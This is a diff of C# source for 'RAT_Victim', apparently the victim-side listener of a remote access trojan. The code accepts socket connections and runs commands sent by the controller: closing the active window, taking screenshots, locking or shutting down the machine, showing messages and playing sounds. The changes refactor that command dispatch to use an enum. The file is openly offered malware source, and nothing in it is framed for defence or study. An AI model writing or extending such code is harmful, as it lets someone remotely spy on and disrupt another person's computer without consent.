@@ -1,14 +1,14 @@
-﻿using System.Net;
+﻿using RAT_Library;
+using System;
+using System.IO;
+using System.Net;
 using System.Net.Sockets;
-using System.Reflection;
-using System.Text;
 
 namespace RAT_Victim
 {
     internal static class Program
     {
         public static Socket Client;
-        private static readonly Encoding CommandEncoding = Encoding.GetEncoding(1251);
 
         private static void Main()
         {
@@ -24,14 +24,35 @@ namespace RAT_Victim
             while (true)
             {
                 Client = server.Accept();
-                var buffer = new byte[64];
+                var buffer = new byte[Common.BufferSize];
                 var byteCount = Client.Receive(buffer);
-                var command = CommandEncoding.GetString(buffer, 0, byteCount);
-                const string prefix = "Message: ";
-                if (command.StartsWith(prefix))
-                    Commands.ShowMessage(command.Replace(prefix, ""));
-                else
-                    typeof(Commands).GetMethod(command, BindingFlags.Static | BindingFlags.NonPublic)?.Invoke(null, null);
+                var command = (RatCommand)buffer[0];
+                switch (command)
+                {
+                    case RatCommand.CloseActiveWindow:
+                        Commands.CloseActiveWindow();
+                        break;
+                    case RatCommand.ShowMessageBox:
+                        Commands.ShowMessageBox();
+                        break;
+                    case RatCommand.TakeScreenshot:
+                        Commands.TakeScreenshot();
+                        break;
+                    case RatCommand.Lock:
+                        Commands.Lock();
+                        break;
+                    case RatCommand.Shutdown:
+                        Commands.Shutdown();
+                        break;
+                    case RatCommand.SendMessage:
+                        Commands.SendMessage(Common.MessageEncoding.GetString(buffer, 1, byteCount));
+                        break;
+                    case RatCommand.PlaySound:
+                        Commands.PlaySound(new MemoryStream(buffer, 1, byteCount));
+                        break;
+                    default:
+                        throw new ArgumentOutOfRangeException();
+                }
             }
             // ReSharper disable once FunctionNeverReturns
         }
